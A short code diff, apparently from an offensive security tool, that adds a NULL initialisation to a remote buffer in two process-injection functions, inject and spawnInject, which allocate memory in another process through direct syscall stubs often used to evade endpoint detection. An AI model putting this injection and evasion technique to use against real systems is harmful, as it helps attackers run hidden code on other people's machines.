@@ -227,6 +227,7 @@ std::string static inline inject(int pid, const std::string& payload, bool useSy
 			PVOID remoteBuffer;
 			SIZE_T sizeToAlloc = payload.size();
 
+			remoteBuffer=NULL;
 			Sw3NtAllocateVirtualMemory_(processHandle, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 			SIZE_T NumberOfBytesWritten;
@@ -351,6 +352,7 @@ std::string static inline spawnInject(const std::string& payload, const std::str
 			PVOID remoteBuffer;
 			SIZE_T sizeToAlloc = payload.size();
 
+			remoteBuffer=NULL;
 			Sw3NtAllocateVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 			SIZE_T NumberOfBytesWritten;
